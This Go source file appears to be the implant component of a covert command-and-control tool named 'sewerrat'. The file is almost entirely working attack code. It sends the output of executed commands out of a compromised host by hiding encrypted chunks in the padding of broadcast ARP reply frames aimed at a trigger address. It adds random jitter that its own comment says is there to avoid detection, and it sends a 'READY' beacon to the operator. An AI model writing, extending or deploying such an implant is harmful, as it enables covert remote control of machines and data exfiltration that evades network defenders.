package implant

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"sewerrat/shared"
)

// ARPBroadcaster handles sending ARP responses with embedded command output
type ARPBroadcaster struct {
	iface *InterfaceInfo
	handle *pcap.Handle
}

// NewARPBroadcaster creates a broadcaster instance
func NewARPBroadcaster(iface *InterfaceInfo) *ARPBroadcaster {
	return &ARPBroadcaster{
		iface: iface,
	}
}

// SendResponse sends an ARP reply with output embedded in padding
// This is called after executing a received command
func (ab *ARPBroadcaster) SendResponse(output string) error {
	// Add jitter to avoid detection
	jitter := time.Duration(rand.Intn(shared.JitterMaxMs-shared.JitterMinMs) + shared.JitterMinMs) * time.Millisecond
	time.Sleep(jitter)

	// Chunk output if needed (max 20 bytes per frame)
	chunks := shared.ChunkPayload([]byte(output))
	if len(chunks) == 0 {
		// No output, send empty response
		chunks = [][]byte{{}}
	}

	// Send each chunk as separate ARP response
	for i, chunk := range chunks {
		if err := ab.sendChunk(chunk, i, len(chunks)); err != nil {
			log.Printf("[!] Failed to send chunk %d/%d: %v\n", i+1, len(chunks), err)
			// Continue sending remaining chunks despite errors
		}

		// Add inter-packet jitter (except for last packet)
		if i < len(chunks)-1 {
			time.Sleep(500 * time.Millisecond)
		}
	}

	return nil
}

// sendChunk sends a single ARP response with one chunk of data
func (ab *ARPBroadcaster) sendChunk(chunk []byte, index int, total int) error {
	// Encrypt chunk if enabled
	encrypted, err := shared.SafeEncrypt(chunk)
	if err != nil {
		encrypted = chunk
	}

	// Create Ethernet layer
	eth := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr(ab.parseMACFromString(ab.iface.HardwareAddr)),
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}, // Broadcast
		EthernetType: layers.EthernetTypeARP,
	}

	// Parse our MAC address
	srcMAC, _ := net.ParseMAC(ab.iface.HardwareAddr)

	// Create ARP layer (reply)
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtocolAddressSize: 4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: net.ParseIP(ab.iface.IP).To4(),
		DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		DstProtAddress:    net.ParseIP("10.255.255.254").To4(), // Trigger IP
	}

	// Build packet buffer with ARP and padding
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// Serialize ARP layer
	if err := arp.SerializeTo(buffer, opts); err != nil {
		return fmt.Errorf("failed to serialize ARP layer: %w", err)
	}

	// Get ARP data and add padding
	arpData := buffer.Bytes()
	padding := shared.FramePadding(encrypted)
	
	// Combine ARP data + padding to reach 64-byte minimum
	fullFrame := append(arpData, padding...)

	// Serialize to final packet
	finalBuffer := gopacket.NewSerializeBuffer()
	if err := eth.SerializeTo(finalBuffer, opts); err != nil {
		return fmt.Errorf("failed to serialize Ethernet layer: %w", err)
	}

	if err := arp.SerializeTo(finalBuffer, opts); err != nil {
		return fmt.Errorf("failed to serialize ARP in final: %w", err)
	}

	// Add padding
	finalBuffer.AppendBytes(len(padding))
	copy(finalBuffer.Bytes()[len(finalBuffer.Bytes())-len(padding):], padding)

	// Send packet
	if err := ab.handle.WritePacketData(finalBuffer.Bytes()); err != nil {
		return fmt.Errorf("failed to write packet: %w", err)
	}

	return nil
}

// parseMACFromString converts MAC string "00:11:22:33:44:55" to bytes
func (ab *ARPBroadcaster) parseMACFromString(macStr string) []byte {
	mac, err := net.ParseMAC(macStr)
	if err != nil {
		return []byte{0, 0, 0, 0, 0, 0}
	}
	return mac
}

// SendBeacon sends an initial beacon to signal readiness
func (ab *ARPBroadcaster) SendBeacon() error {
	// Send a simple "READY" beacon
	return ab.SendResponse("READY")
}

// Close gracefully closes the broadcaster
func (ab *ARPBroadcaster) Close() error {
	// No resources to clean up yet
	return nil
}
